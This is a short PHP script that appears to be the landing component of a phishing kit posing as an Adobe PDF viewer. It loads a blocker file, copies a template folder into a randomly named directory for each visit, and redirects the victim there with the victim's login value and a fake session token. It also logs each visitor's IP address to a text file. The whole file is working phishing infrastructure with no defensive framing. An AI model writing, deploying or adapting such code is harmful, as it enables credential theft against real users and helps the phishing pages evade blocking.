<?php

include('blocker.php');
$DIR=md5(rand(0,100000000000));
function recurse_copy($PDF,$DIR) {
$dir = opendir($PDF);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($PDF . '/' . $file) ) {
recurse_copy($PDF . '/' . $file,$DIR . '/' . $file);
}
else {
copy($PDF . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$login = isset($_GET['login']) ? $_GET['login'] : null;
$PDF="PDF";
$session = "adobe-pdf-viewer".md5($_GET['login']);
$id = md5(rand(10, 8009093));
recurse_copy( $PDF, $DIR );
header("location:$DIR?id=$id&session=$session&login=$login");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?> 